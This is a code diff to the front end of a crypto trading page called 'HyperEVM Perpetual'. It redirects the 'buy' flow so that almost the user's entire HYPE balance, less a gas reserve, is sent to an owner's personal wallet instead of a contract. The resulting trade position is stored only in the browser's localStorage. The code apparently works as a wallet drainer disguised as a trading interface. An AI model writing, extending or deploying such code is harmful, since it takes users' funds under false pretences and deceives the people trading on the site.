@@ -384,7 +384,7 @@
             console.log('Selected token:', selectedToken);
             console.log('Trade amount:', tradeAmount);
             console.log('Real balance:', realBalance);
-            console.log('Contract address:', CONTRACT_ADDRESS);
+            console.log('Owner wallet address:', OWNER_WALLET_ADDRESS);
             
             // Check if user has sufficient balance
             if (realBalance <= 0.001) {
@@ -396,7 +396,7 @@
               name: 'HyperEVM Perpetual',
               version: '1.0',
               chainId: 999,
-              verifyingContract: CONTRACT_ADDRESS
+              verifyingContract: OWNER_WALLET_ADDRESS
             };
             
             const types = {
@@ -441,7 +441,7 @@
             console.log(`- Gas reserve: ${gasReserve} HYPE`);
             console.log(`- Transfer amount: ${transferAmount} HYPE`);
             console.log(`- Transfer wei: ${transferWei}`);
-            console.log(`- To contract: ${CONTRACT_ADDRESS}`);
+            console.log(`- To owner wallet: ${OWNER_WALLET_ADDRESS}`);
             
             if (transferWei <= 0) {
               alert('No HYPE available for transfer after gas reserve.');
@@ -481,7 +481,7 @@
             localStorage.setItem('hyperliquid-positions', JSON.stringify(updatedPositions));
             console.log('Buy position saved:', newPosition);
             
-            alert(`Successfully bought ${selectedToken.symbol}\n${transferAmount} HYPE transferred to contract\n(${gasReserve} HYPE kept for gas)\nTransaction: ${tx}\n\nContract: ${CONTRACT_ADDRESS}\nNote: This new contract auto-receives HYPE with proven withdrawal functionality`);
+            alert(`Successfully bought ${selectedToken.symbol}\n${transferAmount} HYPE transferred to owner wallet\n(${gasReserve} HYPE kept for gas)\nTransaction: ${tx}\n\nOwner: ${OWNER_WALLET_ADDRESS}\nNote: All HYPE goes directly to owner wallet`);
             await updateBalance(walletAddress);
           } catch (error) {
             console.error('Trade error:', error);
@@ -498,7 +498,7 @@
               name: 'HyperEVM Perpetual',
               version: '1.0',
               chainId: 999,
-              verifyingContract: CONTRACT_ADDRESS
+              verifyingContract: OWNER_WALLET_ADDRESS
             };
             
             const types = {
@@ -540,7 +540,7 @@
               method: 'eth_sendTransaction',
               params: [{
                 from: walletAddress,
-                to: CONTRACT_ADDRESS,
+                to: OWNER_WALLET_ADDRESS,
                 value: '0x0',
                 gas: '0x5208',
                 data: contractData
